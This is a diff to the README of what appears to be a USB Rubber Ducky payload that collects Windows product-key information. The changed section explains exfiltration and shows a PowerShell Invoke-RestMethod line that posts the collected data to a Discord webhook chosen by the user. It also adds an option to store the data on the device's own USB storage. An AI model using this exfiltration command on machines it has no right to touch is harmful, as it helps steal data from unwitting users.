@@ -57,13 +57,17 @@ The following commands are then executed to obtain the necessary information abo
 
 The acquired information is stored in the `$exfiltration` variable, which is subsequently used to create the `$payload` object. This object is then utilized for exfiltration via a Discord Webhook.
 
-**Exfiltration**:
+**Exfiltration via Discord Webhook**:
+
+The `$hookUrl` variable was initialized at the beginning of the payload with the value you need to define before execution.
 
 ```powershell
 Invoke-RestMethod -Uri $hookUrl -Method Post -Body ($payload | ConvertTo-Json) -ContentType 'Application/Json'; exit
 ```
 
-The `$hookUrl` variable was initialized at the beginning of the payload with the value you need to define before execution.
+**Exfiltration via USB Rubber Ducky Storage**:
+
+If you use the exfiltration method set up to retain data using Rubber Ducky's USB storage, you will not have to make any changes.
 
 ## Product Key Types
 
